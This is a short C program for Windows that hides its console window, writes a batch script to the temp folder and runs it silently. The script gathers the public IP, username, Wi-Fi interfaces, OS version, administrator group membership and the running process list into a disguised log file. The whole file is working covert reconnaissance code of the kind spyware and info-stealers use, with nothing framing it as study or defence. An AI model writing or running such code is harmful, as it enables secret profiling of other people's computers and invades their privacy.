#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <windows.h>
#include <curl/curl.h>


int main() {
    //initialise the command propmt, snprintf a location of local %temp%
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd,SW_HIDE);

    const char *temp = getenv("TEMP");
    char filepath[512];
    snprintf(filepath, sizeof(filepath), "%s\\temp_script.bat", temp);

    FILE *f = fopen(filepath, "w");

    // Get current time
    time_t t = time(NULL);
    struct tm tm = *localtime(&t);

    // Write batch commands to *f
    fprintf(f,
        "@echo off\n"
        "echo [%.4d-%.2d-%.2d %.2d:%.2d:%.2d] > \"%s\\pnglogfile.txt\"\n"
        "echo. >> \"%s\\pnglogfile.txt\"\n"
        "echo public ip address: >> \"%s\\pnglogfile.txt\"\n"
        "nslookup myip.opendns.com resolver1.opendns.com >> \"%s\\pnglogfile.txt\"\n"
        "echo. >> \"%s\\pnglogfile.txt\"\n"
        "echo whoami: >> \"%s\\pnglogfile.txt\"\n"
        "whoami >> \"%s\\pnglogfile.txt\"\n"
        "echo. >> \"%s\\pnglogfile.txt\"\n"
        "echo netsh info: >> \"%s\\pnglogfile.txt\"\n"
        "netsh wlan show interfaces >> \"%s\\pnglogfile.txt\"\n"
        "echo. >> \"%s\\pnglogfile.txt\"\n"
        "echo what's the OS stuff: >> \"%s\\pnglogfile.txt\"\n"
        "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" >> \"%s\\pnglogfile.txt\"\n"
        "echo. >> \"%s\\pnglogfile.txt\"\n"
        "echo admin?(nyae?) >> \"%s\\pnglogfile.txt\"\n"
        "whoami /groups | find \"S-1-5-32-544\" >> \"%s\\pnglogfile.txt\"\n"
        "echo. >> \"%s\\pnglogfile.txt\"\n"
        "echo all the happenings in pc >> \"%s\\pnglogfile.txt\"\n"
        "tasklist >> \"%s\\pnglogfile.txt\"\n",
        tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday,
        tm.tm_hour, tm.tm_min, tm.tm_sec,
        temp, temp, temp, temp,
        temp, temp, temp, temp,
        temp, temp, temp, temp,
        temp, temp, temp, temp,
        temp, temp, temp, temp
    );

    fclose(f);

    // execute the info in f* in cmd with the var execcmd
    char execCmd[600];
    snprintf(execCmd, sizeof(execCmd), "cmd /c \"%s\"", filepath);
    system(execCmd);

    return 0;
}
